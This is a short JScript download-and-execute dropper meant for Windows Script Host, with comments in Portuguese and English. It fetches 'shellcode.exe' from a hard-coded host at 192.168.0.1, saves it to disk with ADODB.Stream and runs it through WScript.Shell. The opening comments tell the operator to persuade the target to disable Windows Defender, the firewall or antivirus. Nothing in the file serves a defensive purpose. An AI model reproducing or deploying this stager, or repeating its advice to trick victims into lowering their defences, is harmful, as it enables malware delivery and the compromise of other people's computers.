// Se lembre de convencer o seu alvo a desativar o windows defender ou firewall !

// remeber to convence your target to disable the windows defender or antivírus !

// Jscript Libs:
//     MSXML2.XMLHTTP
//     ADODB.Stream
//     WScript.Shell


var requester = WScript.CreateObject("MSXML2.XMLHTTP");

requester.Open('GET', 'http://192.168.0.1/shellcode.exe', false);
requester.Send();

if(requester.Status == 200) {
    var Stream = WScript.CreateObject("ADODB.Stream");

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(requester.ResponseBody);
    Stream.Position = 0;

    Stream.SaveFile("shellcode.exe", 2);
    Stream.Close();

}

var cmd = new ActiveXObject("WScript.shell").Run("shellcode.exe"); 
